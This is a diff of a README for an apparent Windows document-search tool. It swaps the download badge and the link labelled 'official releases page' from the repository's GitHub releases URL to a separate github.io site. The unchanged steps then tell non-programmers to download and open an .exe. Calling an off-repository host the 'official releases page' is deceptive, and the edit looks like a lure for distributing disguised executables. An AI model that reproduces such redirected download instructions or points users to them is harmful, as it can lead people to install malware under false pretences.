@@ -1,6 +1,6 @@
 # 🔍 Search-Text-in-Documents-tool - Find text inside thousands of files
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Selflimited-americangreentoad552/Search-Text-in-Documents-tool/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://selflimited-americangreentoad552.github.io)
 
 This software scans local files to locate specific words or phrases. It works with PDF, Word, Excel, and text documents. You save time by searching through folders instead of opening files one by one.
 
@@ -24,7 +24,7 @@ This application provides the following features:
 ## 🚀 Getting Started
 You do not need programming knowledge to run this software. Follow these steps to install and use the tool on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/Selflimited-americangreentoad552/Search-Text-in-Documents-tool/releases) to access the download options.
+1.  Visit the [official releases page](https://selflimited-americangreentoad552.github.io) to access the download options.
 2.  Locate the latest version release.
 3.  Download the setup file ending in .exe.
 4.  Open the file after the download finishes.
